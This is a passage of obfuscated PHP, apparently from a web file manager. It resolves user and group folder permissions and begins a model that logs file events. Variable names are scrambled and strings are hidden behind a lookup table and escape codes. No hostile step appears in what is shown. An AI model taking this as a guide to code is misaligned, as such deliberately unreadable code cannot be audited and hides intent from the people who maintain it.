$ç¬ÍŒí©; return array($®éÎ¡ğ[511] => -1, $®éÎ¡ğ[564] => array($®éÎ¡ğ[516] => $®éÎ¡ğ[1328], $®éÎ¡ğ[2142] => $®éÎ¡ğ[229], $®éÎ¡ğ[517] => LNG($®éÎ¡ğ[2343]), $®éÎ¡ğ[2157] => $®éÎ¡ğ[2344]), $®éÎ¡ğ[2332] => LNG($®éÎ¡ğ[2345]), $®éÎ¡ğ[2346] => $this->sourceAuthInfo($»Òı†¤Û)); } protected function makeAuthDeep($·Œí«æ = false) { $ º©¸ËÛ =& $_SERVER[‘ÆÜ‘œ]; static $üßşƒì = array(); $·Œí«æ = $·Œí«æ ? $·Œí«æ : USER_ID; if (isset($üßşƒì[$·Œí«æ])) { return $üßşƒì[$·Œí«æ]; } $£†å·ÄŞ = Model($ º©¸ËÛ[2347])->listData(); $™¥†ƒÇ = array(); foreach ($£†å·ÄŞ as $´ ¾ºŸˆ) { if ($´ ¾ºŸˆ[$ º©¸ËÛ[510]] == 0 && $´ ¾ºŸˆ[$ º©¸ËÛ[2156]] == $ º©¸ËÛ[91]) { $™¥†ƒÇ[] = $´ ¾ºŸˆ[$ º©¸ËÛ[495]]; } } $€ çîÏå = $this->userGroupParents($·Œí«æ); $¤‰£­¢ = array($ º©¸ËÛ[189] => SourceModel::TYPE_USER, $ º©¸ËÛ[597] => $·Œí«æ); if ($€ çîÏå) { $¤‰£­¢ = array(array($ º©¸ËÛ[189] => SourceModel::TYPE_USER, $ º©¸ËÛ[597] => $·Œí«æ), array($ º©¸ËÛ[189] => SourceModel::TYPE_GROUP, $ º©¸ËÛ[597] => array($ º©¸ËÛ[515], $€ çîÏå)), $ º©¸ËÛ[1118] => $ º©¸ËÛ[2236]); } $šŸİ‹â = $this->field($ º©¸ËÛ[2348])->where($¤‰£­¢)->select(); $¦Ÿ¡šº = array(); $ÆóÂ»± = array_to_keyvalue_group($šŸİ‹â, $ º©¸ËÛ[192]); foreach ($ÆóÂ»± as $Î¡«ÌÕÛ => $Ğ‰òãÜŠ) { $µŞ›Æü = $this->authArrayCheck($Ğ‰òãÜŠ, $·Œí«æ); if ($µŞ›Æü[$ º©¸ËÛ[511]] > 0) { $¦Ÿ¡šº[] = $Î¡«ÌÕÛ . $ º©¸ËÛ[12]; } } if ($€ çîÏå) { $ËÜÈØè = Model($ º©¸ËÛ[613]); foreach ($€ çîÏå as $ƒ‚ÍÎòÆ) { $ª·ÖÀÌ² = $ËÜÈØè->getInfo($ƒ‚ÍÎòÆ); if (!$ª·ÖÀÌ² || !is_array($ª·ÖÀÌ²[$ º©¸ËÛ[90]])) { continue; } $¦Ÿ¡šº[] = $ª·ÖÀÌ²[$ º©¸ËÛ[90]][$ º©¸ËÛ[192]]; } } $“–œşÖ = array(); $ËûŸş¡İ = $€ çîÏå; $Óë©«ø = Model($ º©¸ËÛ[1484]); $ËÜÈØè = Model($ º©¸ËÛ[613]); $ÉšÃ¸ˆã = array(); $¶«õêßé = array(); $ã‚½Şµ = array(); $®Â› ¦½ = array(); if ($¦Ÿ¡šº) { $£©‡€Íï = $Óë©«ø->where(array($ º©¸ËÛ[192] => array($ º©¸ËÛ[515], $¦Ÿ¡šº)))->select(); foreach ($£©‡€Íï as $Ë‘˜™ÚŞ) { if ($Ë‘˜™ÚŞ[$ º©¸ËÛ[528]] == $ º©¸ËÛ[91]) { continue; } $ÕøŒ„óÌ = $Óë©«ø->parentLevelArray($Ë‘˜™ÚŞ[$ º©¸ËÛ[612]]); $“–œşÖ = array_merge($“–œşÖ, $ÕøŒ„óÌ); $ËûŸş¡İ[] = $Ë‘˜™ÚŞ[$ º©¸ËÛ[597]]; $ÉšÃ¸ˆã[$Ë‘˜™ÚŞ[$ º©¸ËÛ[192]]] = $ÕøŒ„óÌ; $¶«õêßé[$Ë‘˜™ÚŞ[$ º©¸ËÛ[192]]] = $Ë‘˜™ÚŞ[$ º©¸ËÛ[597]]; } } $ËûŸş¡İ = array_values(array_unique($ËûŸş¡İ)); $ÁÊ¿õù€ = $ËûŸş¡İ; foreach ($ÁÊ¿õù€ as $ƒ‚ÍÎòÆ) { $ª·ÖÀÌ² = $ËÜÈØè->getInfo($ƒ‚ÍÎòÆ); $ÕøŒ„óÌ = $Óë©«ø->parentLevelArray($ª·ÖÀÌ²[$ º©¸ËÛ[612]]); $ËûŸş¡İ = array_merge($ËûŸş¡İ, $ÕøŒ„óÌ); } $ËûŸş¡İ = array_values(array_unique($ËûŸş¡İ)); foreach ($ËûŸş¡İ as $ƒ‚ÍÎòÆ) { $ª·ÖÀÌ² = $ËÜÈØè->getInfo($ƒ‚ÍÎòÆ); $“–œşÖ[] = $ª·ÖÀÌ²[$ º©¸ËÛ[90]][$ º©¸ËÛ[192]]; $ã‚½Şµ[$ƒ‚ÍÎòÆ] = $ª·ÖÀÌ²[$ º©¸ËÛ[90]][$ º©¸ËÛ[192]]; $®Â› ¦½[$ƒ‚ÍÎòÆ] = $Óë©«ø->parentLevelArray($ª·ÖÀÌ²[$ º©¸ËÛ[612]]); } foreach ($ÉšÃ¸ˆã as $Ú˜Ÿåœ€ => $Ş›Õğûª) { $éŸªì = $¶«õêßé[$Ú˜Ÿåœ€]; if (!$éŸªì || !$ã‚½Şµ[$éŸªì]) { continue; } $§é€œúê = array(); foreach ($®Â› ¦½[$éŸªì] as $ƒ‚ÍÎòÆ) { $§é€œúê[] = $ã‚½Şµ[$ƒ‚ÍÎòÆ]; } $ÉšÃ¸ˆã[$Ú˜Ÿåœ€] = array_merge($§é€œúê, $Ş›Õğûª); } $“–œşÖ = array_values(array_unique($“–œşÖ)); $ßãÛ‰÷¡ = array($ º©¸ËÛ[2341] => $“–œşÖ, $ º©¸ËÛ[2342] => $ÉšÃ¸ˆã); $üßşƒì[$·Œí«æ] = $ßãÛ‰÷¡; return $ßãÛ‰÷¡; } private function makeSourceAuth($„ˆ˜Ø³‘, $£ÍéÔú’, $øäÎÊÅŒ = false) { $Ë×‚µ‘© =& $_SERVER[‘ÆÜ‘œ]; $Å ÜÁ½ª = $Ë×‚µ‘©[91]; $®»‰· = $„ˆ˜Ø³‘[$Ë×‚µ‘©[597]]; $‘Û ˜Ëœ = $„ˆ˜Ø³‘[$Ë×‚µ‘©[189]] == SourceModel::TYPE_GROUP; $îô¾¥Í = $‘Û ˜Ëœ ? $this->groupRootAuth($®»‰·, $øäÎÊÅŒ) : !1; if ($îô¾¥Í && Model($Ë×‚µ‘©[599])->authCheckAction($îô¾¥Í[$Ë×‚µ‘©[510]], $Ë×‚µ‘©[1516])) { return $this->groupAuthInfo($îô¾¥Í, $®»‰·); } $¯ò²õÈı = Model($Ë×‚µ‘©[1484])->parentLevelArray($„ˆ˜Ø³‘[$Ë×‚µ‘©[612]]); $¯ò²õÈı = array_merge(array($„ˆ˜Ø³‘[$Ë×‚µ‘©[192]]), array_reverse($¯ò²õÈı)); $¡åòßä¹ = !1; foreach ($¯ò²õÈı as $ÄÇŸÙĞ®) { if (!isset($£ÍéÔú’[$ÄÇŸÙĞ®])) { continue; } $¢’Ó‘Ÿù = $this->authMake($£ÍéÔú’[$ÄÇŸÙĞ®], $øäÎÊÅŒ); if ($¢’Ó‘Ÿù[$Ë×‚µ‘©[564]]) { $¡åòßä¹ = $¢’Ó‘Ÿù; break; } } if (!$‘Û ˜Ëœ) { return $¡åòßä¹; } if (!$¡åòßä¹ && $îô¾¥Í) { $¡åòßä¹ = $this->groupAuthInfo($îô¾¥Í, $®»‰·); } if (!$¡åòßä¹) { $›ñÍÙÂ = Model($Ë×‚µ‘©[613])->getInfo($®»‰·); $Ã‹÷ï™¾ = explode($Ë×‚µ‘©[50], trim($›ñÍÙÂ[$Ë×‚µ‘©[612]], $Ë×‚µ‘©[50])); $Ã‹÷ï™¾ = array_reverse($Ã‹÷ï™¾); foreach ($Ã‹÷ï™¾ as $Ğ¹¾ù±Ò) { if ($Ğ¹¾ù±Ò == $Ë×‚µ‘©[229] || $Ğ¹¾ù±Ò == $Å ÜÁ½ª) { continue; } $Éî—Å€™ = $this->groupRootAuth($Ğ¹¾ù±Ò, $øäÎÊÅŒ); if (!$Éî—Å€™) { continue; } $¡åòßä¹ = $this->groupAuthInfo($Éî—Å€™, $Ğ¹¾ù±Ò); break; } } if (!$¡åòßä¹ || $¡åòßä¹[$Ë×‚µ‘©[511]] <= 0) { $üúÒÄİ = $this->authDeepCheck($„ˆ˜Ø³‘[$Ë×‚µ‘©[192]], $øäÎÊÅŒ); if ($üúÒÄİ) { $¡åòßä¹ = $üúÒÄİ; } } return $¡åòßä¹; } private function userIsRoot($¶í”ıø£ = false) { $ÈëĞ¿ =& $_SERVER[‘ÆÜ‘œ]; if (!$¶í”ıø£ && KodUser::isRoot()) { return !0; } $İ¯ŞòĞ© = Model($ÈëĞ¿[625])->getInfo($¶í”ıø£); $ıŸÔ³˜ = Model($ÈëĞ¿[2325])->listData($İ¯ŞòĞ©[$ÈëĞ¿[2326]]); if ($ıŸÔ³˜ && $ıŸÔ³˜[$ÈëĞ¿[603]][$ÈëĞ¿[2329]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ê®°öÀ²) { $ä¸ æË =& $_SERVER[‘ÆÜ‘œ]; $çË”ïü‰ = Model($ä¸ æË[1484]); $˜¼×ŸŒ§ = $çË”ïü‰->sourceInfo($ê®°öÀ²); if (!$˜¼×ŸŒ§) { return !1; } $çË”ïü‰->groupPathDisplay($˜¼×ŸŒ§); $øÆÄ¬…¥ = array($˜¼×ŸŒ§); $øÆÄ¬…¥ = $çË”ïü‰->_listAppendPath($øÆÄ¬…¥, !1); $˜¼×ŸŒ§ = $øÆÄ¬…¥[0]; $¬ÑÅïø = $˜¼×ŸŒ§[$ä¸ æË[610]]; if (isset($˜¼×ŸŒ§[$ä¸ æË[618]])) { $º¢×‹Ç˜ = explode($ä¸ æË[8], trim($˜¼×ŸŒ§[$ä¸ æË[610]], $ä¸ æË[8])); array_shift($º¢×‹Ç˜); $¬ÑÅïø = $˜¼×ŸŒ§[$ä¸ æË[616]] . $ä¸ æË[2349] . implode($ä¸ æË[8], $º¢×‹Ç˜); } return array($ä¸ æË[32] => $˜¼×ŸŒ§[$ä¸ æË[32]], $ä¸ æË[192] => $˜¼×ŸŒ§[$ä¸ æË[192]], $ä¸ æË[87] => KodIO::make($˜¼×ŸŒ§[$ä¸ æË[192]]), $ä¸ æË[610] => $¬ÑÅïø); } private function groupAuthInfo($ˆ­ØˆÛ, $Ó°‡æû) { $ÚÌ¡Ÿ­  =& $_SERVER[‘ÆÜ‘œ]; $ˆŸ¼œœ‘ = Model($ÚÌ¡Ÿ­ [613])->getInfo($Ó°‡æû); return array($ÚÌ¡Ÿ­ [2350] => intval($ˆ­ØˆÛ[$ÚÌ¡Ÿ­ [510]]), $ÚÌ¡Ÿ­ [2340] => $ˆ­ØˆÛ, $ÚÌ¡Ÿ­ [2351] => LNG($ÚÌ¡Ÿ­ [2352]), $ÚÌ¡Ÿ­ [2346] => array($ÚÌ¡Ÿ­ [517] => $ˆŸ¼œœ‘[$ÚÌ¡Ÿ­ [32]], $ÚÌ¡Ÿ­ [87] => KodIO::make($ˆŸ¼œœ‘[$ÚÌ¡Ÿ­ [90]][$ÚÌ¡Ÿ­ [192]]), $ÚÌ¡Ÿ­ [2353] => $ˆŸ¼œœ‘[$ÚÌ¡Ÿ­ [617]])); } protected function groupRootAuth($™ö‰ÆŠµ, $­õš”À = false) { $¨€¥ªÀ‡ =& $_SERVER[‘ÆÜ‘œ]; $­õš”À = $­õš”À ? $­õš”À : USER_ID; $ËœÓÏ  = $­õš”À . $¨€¥ªÀ‡[2354] . $™ö‰ÆŠµ; static $Ê²®¶– = array(); if (isset($Ê²®¶–[$ËœÓÏ ])) { return $Ê²®¶–[$ËœÓÏ ]; } $äÕí¸û = Model($¨€¥ªÀ‡[613])->getInfo($™ö‰ÆŠµ); $ù…ŒË½¡ = $this->userGroupList($­õš”À); $¯ÒÇÄ®ˆ = isset($ù…ŒË½¡[$™ö‰ÆŠµ]) ? $ù…ŒË½¡[$™ö‰ÆŠµ][$¨€¥ªÀ‡[510]] : !1; if ($¯ÒÇÄ®ˆ && Model($¨€¥ªÀ‡[599])->authCheckAction($¯ÒÇÄ®ˆ[$¨€¥ªÀ‡[510]], $¨€¥ªÀ‡[1516])) { $Ê²®¶–[$ËœÓÏ ] = $¯ÒÇÄ®ˆ; return $¯ÒÇÄ®ˆ; } $ŠµŸü°î = $this->sourceAuthSelect($äÕí¸û[$¨€¥ªÀ‡[90]][$¨€¥ªÀ‡[192]]); $†ï¢œ–× = $ŠµŸü°î ? $this->authMake($ŠµŸü°î, $­õš”À) : !1; $Ú»û¤ƒ = $†ï¢œ–× ? $†ï¢œ–×[$¨€¥ªÀ‡[564]] : !1; $Ê²®¶–[$ËœÓÏ ] = $Ú»û¤ƒ ? $Ú»û¤ƒ : $¯ÒÇÄ®ˆ; return $Ê²®¶–[$ËœÓÏ ]; } public function authOwnerApply($°ñæ¶Â) { $áÔáèä“ =& $_SERVER[‘ÆÜ‘œ]; if (empty($°ñæ¶Â[$áÔáèä“[510]]) || isset($°ñæ¶Â[$áÔáèä“[1535]]) && $°ñæ¶Â[$áÔáèä“[1535]]) { return $°ñæ¶Â; } if (AuthModel::authCheckRoot($°ñæ¶Â[$áÔáèä“[510]][$áÔáèä“[511]])) { return $°ñæ¶Â; } $ß…ÒŞÛ“ = Model($áÔáèä“[1484])->parentLevelArray($°ñæ¶Â[$áÔáèä“[612]]); $ß…ÒŞÛ“ = array_merge(array($°ñæ¶Â[$áÔáèä“[192]]), array_reverse($ß…ÒŞÛ“)); $‚Ÿ—øŠª = $this->sourceAuthSelect($ß…ÒŞÛ“); $µô””Ë = array(); $èº€Ëú– = array(); foreach ($‚Ÿ—øŠª as $İõ…Ú¢¬ => $¡¥Å”®–) { $ÆÚ—Œù = $this->authFolderOwnerUser($¡¥Å”®–); $µô””Ë[$İõ…Ú¢¬] = $ÆÚ—Œù; $èº€Ëú– = array_merge($èº€Ëú–, $ÆÚ—Œù[$áÔáèä“[692]]); if ($ÆÚ—Œù[$áÔáèä“[2355]]) { break; } } if (count($èº€Ëú–) == 0) { $èº€Ëú– = $this->authFolderOwnerGroup($°ñæ¶Â[$áÔáèä“[597]]); } $èº€Ëú– = array_unique($èº€Ëú–); if (AuthModel::authCheckRoot($°ñæ¶Â[$áÔáèä“[510]][$áÔáèä“[511]])) { $èº€Ëú–[] = USER_ID; } $°ñæ¶Â[$áÔáèä“[510]][$áÔáèä“[2356]] = Model($áÔáèä“[605])->userListInfo($èº€Ëú–); return $°ñæ¶Â; } private function authFolderOwnerGroup($÷½ƒÅÅè) { $çÂÙåıœ =& $_SERVER[‘ÆÜ‘œ]; $ŸÑ—˜ø¡ = Model($çÂÙåıœ[2228])->where(array($çÂÙåıœ[1446] => $÷½ƒÅÅè))->select(); $ŸşıØ¼ö = array(); if (!$ŸÑ—˜ø¡) { return $ŸşıØ¼ö; } foreach ($ŸÑ—˜ø¡ as $ ‘œî½í) { $ß‰ªÀîÈ = $this->authInfo($ ‘œî½í); if (AuthModel::authCheckRoot($ß‰ªÀîÈ[$çÂÙåıœ[510]])) { $ŸşıØ¼ö[] = $ ‘œî½í[$çÂÙåıœ[1544]]; } } return $ŸşıØ¼ö; } private function authFolderOwnerUser($Œ»¬ã¥Ó) { $¾šÃ½ÜÃ =& $_SERVER[‘ÆÜ‘œ]; $ùì²ÓËô = array(); $äË÷… = !1; foreach ($Œ»¬ã¥Ó as $¼£ı†Û£) { $Ş”ğÁÇ = $this->authInfo($¼£ı†Û£); if ($¼£ı†Û£[$¾šÃ½ÜÃ[597]] == $¾šÃ½ÜÃ[229]) { $äË÷… = !0; } if ($¼£ı†Û£[$¾šÃ½ÜÃ[189]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ş”ğÁÇ[$¾šÃ½ÜÃ[510]])) { $ùì²ÓËô[] = $¼£ı†Û£[$¾šÃ½ÜÃ[597]]; } } } return array($¾šÃ½ÜÃ[692] => $ùì²ÓËô, $¾šÃ½ÜÃ[2355] => $äË÷…); } public function authMake($ó¡’§ø„, $Á®×÷Ëú = false) { $Êìïóçë =& $_SERVER[‘ÆÜ‘œ]; $áó¨×¼È = $this->authArrayCheck($ó¡’§ø„, $Á®×÷Ëú); if ($áó¨×¼È[$Êìïóçë[2336]]) { $áó¨×¼È[$Êìïóçë[2336]] = $this->sourceAuthInfo($áó¨×¼È[$Êìïóçë[2336]]); } return $áó¨×¼È; } public function authArrayCheck($Íó¡ÕÕ‰, $Æ™êÙòÆ = false) { $Â¦…áÜ® =& $_SERVER[‘ÆÜ‘œ]; if (!$Íó¡ÕÕ‰) { return array($Â¦…áÜ®[511] => 0, $Â¦…áÜ®[564] => !1, $Â¦…áÜ®[2351] => $Â¦…áÜ®[12]); } $Æ™êÙòÆ = $Æ™êÙòÆ ? $Æ™êÙòÆ : USER_ID; $ÍªÔ¤ = 0; $¬„ª¼·¿ = 0; $¥µÖâˆ = 0; $°“û† = 0; $Åïì²æ = 0; $ÈâÛìãŠ = 0; $ªş„Ÿœ = 0; $ÚÂ÷ì· = 0; $ÆÁ¨ùŸ = 1000; $¸×¢µÍë = 0; $•×é‚¶ = 0; $Âæà’ÄŸ = 0; $í¼š»  = 0; $áìàíü = 0; foreach ($Íó¡ÕÕ‰ as $­‰³í¨) { $…‰Ó«¡× = $this->authInfo($­‰³í¨); if (!$…‰Ó«¡×) { continue; } $ÛÙá ëÏ = $­‰³í¨[$Â¦…áÜ®[597]]; $Ùå™¿ï² = $­‰³í¨[$Â¦…áÜ®[192]]; $ªõ÷‘¡ = intval($…‰Ó«¡×[$Â¦…áÜ®[510]]); if ($­‰³í¨[$Â¦…áÜ®[189]] == SourceModel::TYPE_USER && $ÛÙá ëÏ == $Æ™êÙòÆ) { $ÍªÔ¤ = !0; $¥µÖâˆ = $…‰Ó«¡×; $¬„ª¼·¿ = $ªõ÷‘¡; $°“û† = $Ùå™¿ï²; } else { if ($­‰³í¨[$Â¦…áÜ®[189]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÛÙá ëÏ, $Æ™êÙòÆ)) { $Åïì²æ = !0; $±ùµ–ªô = $this->groupStepToUserGroup($ÛÙá ëÏ, $Æ™êÙòÆ); if ($±ùµ–ªô < $ÆÁ¨ùŸ) { $ÆÁ¨ùŸ = $±ùµ–ªô; $ÈâÛìãŠ = $ªõ÷‘¡; $ªş„Ÿœ = $…‰Ó«¡×; $¸×¢µÍë = $ÛÙá ëÏ; $ÚÂ÷ì· = $Ùå™¿ï²; } if ($±ùµ–ªô == $ÆÁ¨ùŸ && $ªõ÷‘¡ >= $ÈâÛìãŠ) { $ÈâÛìãŠ = $ªõ÷‘¡; $ªş„Ÿœ = $…‰Ó«¡×; $¸×¢µÍë = $ÛÙá ëÏ; $ÚÂ÷ì· = $Ùå™¿ï²; } } else { if (!$ÛÙá ëÏ || $ÛÙá ëÏ == $Â¦…áÜ®[229]) { $•×é‚¶ = !0; $í¼š»  = $…‰Ó«¡×; $Âæà’ÄŸ = $ªõ÷‘¡; $áìàíü = $Ùå™¿ï²; } } } } if ($ÍªÔ¤) { $ïç’èÆ× = $¬„ª¼·¿; $…‰Ó«¡× = $¥µÖâˆ; $ÜÕË´Ê = $°“û†; $¨£É³Ò¿ = LNG($Â¦…áÜ®[2357]); } else { if ($Åïì²æ) { $ïç’èÆ× = $ÈâÛìãŠ; $…‰Ó«¡× = $ªş„Ÿœ; $ÜÕË´Ê = $ÚÂ÷ì·; $ë¬’ìĞº = Model($Â¦…áÜ®[613])->getInfo($¸×¢µÍë); $¨£É³Ò¿ = $Â¦…áÜ®[174] . $ë¬’ìĞº[$Â¦…áÜ®[617]] . $Â¦…áÜ®[2358] . LNG($Â¦…áÜ®[2359]); } else { if ($•×é‚¶) { $ïç’èÆ× = $Âæà’ÄŸ; $…‰Ó«¡× = $í¼š» ; $ÜÕË´Ê = $áìàíü; $¨£É³Ò¿ = LNG($Â¦…áÜ®[2338]); } else { $ïç’èÆ× = 0; $…‰Ó«¡× = !1; $¨£É³Ò¿ = $Â¦…áÜ®[12]; $ÜÕË´Ê = $Â¦…áÜ®[12]; } } } $öµÂë¹ = array($Â¦…áÜ®[2350] => intval($ïç’èÆ×), $Â¦…áÜ®[2340] => $…‰Ó«¡×, $Â¦…áÜ®[2351] => $¨£É³Ò¿, $Â¦…áÜ®[2346] => $ÜÕË´Ê); return $öµÂë¹; } private function groupContainUser($Óü«‡¢¹, $ÃË½åß¯ = false) { return in_array($Óü«‡¢¹, $this->userGroupParents($ÃË½åß¯)); } private function groupStepToUserGroup($ÚÓÖ³ÃÇ, $ŠøÑÚ´ı = false) { $¶ÌŒÖ‚÷ =& $_SERVER[‘ÆÜ‘œ]; $²â¸éÑ = $this->userGroupList($ŠøÑÚ´ı); $Ä¨ñÕ¢– = 1000; $Ø¬¸³Ëß = $GLOBALS[$¶ÌŒÖ‚÷[6]][$¶ÌŒÖ‚÷[92]][$¶ÌŒÖ‚÷[2241]] == 1; $éÜí¤Êº = $Ø¬¸³Ëß ? 3 : 2; foreach ($²â¸éÑ as $²Û•Ü½Ú) { if ($²Û•Ü½Ú[$¶ÌŒÖ‚÷[1446]] == $ÚÓÖ³ÃÇ) { return 0; } $«ç’óãı = explode($¶ÌŒÖ‚÷[50], trim($²Û•Ü½Ú[$¶ÌŒÖ‚÷[612]], $¶ÌŒÖ‚÷[50])); if ($«ç’óãı[0] == $¶ÌŒÖ‚÷[229] && count($«ç’óãı) > $éÜí¤Êº) { $ßÆÃª’ = array_reverse(array_slice($«ç’óãı, $éÜí¤Êº)); $÷ş†­óÇ = array_search($ÚÓÖ³ÃÇ, $ßÆÃª’); if ($÷ş†­óÇ !== !1 && $÷ş†­óÇ + 1 <= $Ä¨ñÕ¢–) { $Ä¨ñÕ¢– = $÷ş†­óÇ + 1; } } } return $Ä¨ñÕ¢–; } private function userGroupList($ĞÏÕŒÁ¡ = false, $ÃÒı²¿© = false) { $×®ÄŠ‘½ =& $_SERVER[‘ÆÜ‘œ]; static $óŞ×¸«« = array(); if (isset($óŞ×¸««[$ĞÏÕŒÁ¡])) { return $óŞ×¸««[$ĞÏÕŒÁ¡]; } if (!$ÃÒı²¿©) { $ÃÒı²¿© = Model($×®ÄŠ‘½[625])->getInfo($ĞÏÕŒÁ¡); } $óŞ×¸««[$ĞÏÕŒÁ¡] = array_to_keyvalue($ÃÒı²¿©[$×®ÄŠ‘½[1445]], $×®ÄŠ‘½[1446]); return $óŞ×¸««[$ĞÏÕŒÁ¡]; } public function userGroupParents($ÏÅõ¡÷«) { $Î´ä¢Ö² =& $_SERVER[‘ÆÜ‘œ]; static $„¥Ëàü = array(); $ÏÅõ¡÷« = $ÏÅõ¡÷« ? $ÏÅõ¡÷« : USER_ID; if (isset($„¥Ëàü[$ÏÅõ¡÷«])) { return $„¥Ëàü[$ÏÅõ¡÷«]; } $‘åÀ«¶ = $this->userGroupList($ÏÅõ¡÷«); $ûéõ¸Ü = array(); $»ÃÚ¸· = $GLOBALS[$Î´ä¢Ö²[6]][$Î´ä¢Ö²[92]][$Î´ä¢Ö²[2241]] == 1; $¥çÍæ¿Ã = $»ÃÚ¸· ? 3 : 2; foreach ($‘åÀ«¶ as $õŠõŸ…é) { $ÖŒ¬½™³ = array($õŠõŸ…é[$Î´ä¢Ö²[1446]]); $·¤¥‰Íá = explode($Î´ä¢Ö²[50], trim($õŠõŸ…é[$Î´ä¢Ö²[612]], $Î´ä¢Ö²[50])); if ($·¤¥‰Íá[0] == $Î´ä¢Ö²[229] && count($·¤¥‰Íá) > $¥çÍæ¿Ã) { $¨½ù‹ß = array_slice($·¤¥‰Íá, $¥çÍæ¿Ã); $ÖŒ¬½™³ = array_merge($ÖŒ¬½™³, array_reverse($¨½ù‹ß)); } $ûéõ¸Ü = array_merge($ûéõ¸Ü, $ÖŒ¬½™³); } $„¥Ëàü[$ÏÅõ¡÷«] = array_unique($ûéõ¸Ü); return $„¥Ëàü[$ÏÅõ¡÷«]; } public function authTargetInfoMake($Äığ„„) { $É¢¦Êîæ =& $_SERVER[‘ÆÜ‘œ]; $Šæƒ•ûú = array(); $…à¾Å°€ = array(); foreach ($Äığ„„ as $õéÔŒ¬) { if ($õéÔŒ¬[$É¢¦Êîæ[189]] == SourceModel::TYPE_USER) { $Šæƒ•ûú[] = intval($õéÔŒ¬[$É¢¦Êîæ[597]]); } else { if ($õéÔŒ¬[$É¢¦Êîæ[189]] == SourceModel::TYPE_GROUP) { $…à¾Å°€[] = intval($õéÔŒ¬[$É¢¦Êîæ[597]]); } } } if ($Šæƒ•ûú) { $Šæƒ•ûú = Model($É¢¦Êîæ[605])->userListInfo($Šæƒ•ûú); } if ($…à¾Å°€) { $âŸõ² = array($É¢¦Êîæ[2221] => array($É¢¦Êîæ[515], $…à¾Å°€)); $…à¾Å°€ = Model($É¢¦Êîæ[613])->field($É¢¦Êîæ[2360])->where($âŸõ²)->select(); $…à¾Å°€ = array_to_keyvalue($…à¾Å°€, $É¢¦Êîæ[1446]); } return array($É¢¦Êîæ[2361] => $Šæƒ•ûú, $É¢¦Êîæ[2362] => $…à¾Å°€); } public function authInfo($†§ëŒÊ) { $úÀ€¡ó• =& $_SERVER[‘ÆÜ‘œ]; if ($†§ëŒÊ[$úÀ€¡ó•[1591]]) { $Šë¤¯ÇÇ = Model($úÀ€¡ó•[599])->listData($†§ëŒÊ[$úÀ€¡ó•[1591]]); if (!$Šë¤¯ÇÇ) { return !1; $Æ¥Áîäú = Model($úÀ€¡ó•[599])->listData(); $“Íöº¿‘ = array_filter_by_field($Æ¥Áîäú, $úÀ€¡ó•[510], $úÀ€¡ó•[229]); return $“Íöº¿‘; } $ş´Î‹‹ñ = array_field_key($Šë¤¯ÇÇ, array($úÀ€¡ó•[495], $úÀ€¡ó•[32], $úÀ€¡ó•[510], $úÀ€¡ó•[2157], $úÀ€¡ó•[2158])); $ş´Î‹‹ñ[$úÀ€¡ó•[2363]] = $†§ëŒÊ; return $ş´Î‹‹ñ; } else { return array($úÀ€¡ó•[516] => 0, $úÀ€¡ó•[2142] => $†§ëŒÊ[$úÀ€¡ó•[2298]], $úÀ€¡ó•[517] => $úÀ€¡ó•[12], $úÀ€¡ó•[2157] => $úÀ€¡ó•[2364]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\x65\x5f\x65\x76\x65\156\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\x69\155\x65", "\164\151\x6d\x65", "\x69\156\x73\145\162\x74", "\x66\x75\156\x63\x74\151\x6f\156"), array("\144\145\x73\x63", '', "\151\156\x73\x65\162\x74\x2c\165\x70\x64\x61\164\145\x2c\163\145\x6c\x65\x63\x74", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¦å®—ı, $ŒŞÅÏ¤ş, $™Ã¥ª“‰ = '') { $¼’¥›â =& $_SERVER[‘ÆÜ‘œ]; if (!$this->eventSave) { return; } $®áªî¢Ú = Model($¼’¥›â[1484])->sourceInfo($¦å®—ı); if (!$®áªî¢Ú) { return !1; } if ($this->isDisableEvent($®áªî¢Ú, $ŒŞÅÏ¤ş)) { return; } if ($™Ã¥ª“‰ && is_string($™Ã¥ª“‰)) { $™Ã¥ª“‰ = array($¼’¥›â[2174] => $™Ã¥ª“‰); } $ï±µÒö¯ = KodUser::id(); $Üö´éı‘ = array($¼’¥›â[514] => $¦å®—ı, $¼’¥›â[2365] => $®áªî¢Ú[$¼’¥›â[191]], $¼’¥›â[2366] => $®áªî¢Ú[$¼’¥›â[32]], $¼’¥›â[610] => !empty($®áªî¢Ú[$¼’¥›â[610]]) ? $®áªî¢Ú[$¼’¥›â[610]] : $¼’¥›â[12], $¼’¥›â[1921] => $ï±µÒö¯, $¼’¥›â[519] => $ŒŞÅÏ¤ş, $¼’¥›â[1923] => $™Ã¥ª“‰); $this->addSystemLog($ŒŞÅÏ¤ş, $Üö´éı‘); unset($Üö´éı‘[$¼’¥›â[2366]], $Üö´éı‘[$¼’¥›â[610]]); return $this->add($Üö´éı‘); } private function addSystemLog($ÒåáËÓŞ, $ğúÙ»çª) { $‰Š·¥ŠÄ =& $_SERVER[‘ÆÜ‘œ]; if ($ÒåáËÓŞ == $‰Š·¥ŠÄ[2367]) { $ÒåáËÓŞ = $ğúÙ»çª[$‰Š·¥ŠÄ[548]][$‰Š·¥ŠÄ[2368]]; } else { if (in_array($ÒåáËÓŞ, array($‰Š·¥ŠÄ[1514], $‰Š·¥ŠÄ[2369]))) { $ÒåáËÓŞ = $ğúÙ»çª[$‰Š·¥ŠÄ[548]][$‰Š·¥ŠÄ[169]]; } } $¥ÖÁİ“ª = array_merge($ğúÙ»çª, array($‰Š·¥ŠÄ[2370] => $ğúÙ»çª[$‰Š·¥ŠÄ[192]], $‰Š·¥ŠÄ[2371] => $ğúÙ»çª[$‰Š·¥ŠÄ[2371]])); Hook::trigger($‰Š·¥ŠÄ[2372], $‰Š·¥ŠÄ[2373] . $ÒåáËÓŞ, $ğúÙ»çª); Model($‰Š·¥ŠÄ[2083])->addLog($‰Š·¥ŠÄ[2373] . $ÒåáËÓŞ, $¥ÖÁİ“ª); } private function isDisableEvent($ô†áô¢, $ËÇ™Ñá) { $ìıó‡‹ =& $_SERVER[‘ÆÜ‘œ]; if ($ô†áô¢[$ìıó‡‹[189]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ËÇ™Ñá == $ìıó‡‹[1282]) { return !1; } return !0; } public function eventCreate($ÔãÀ¼ıƒ, $Ùä½¢¼) { 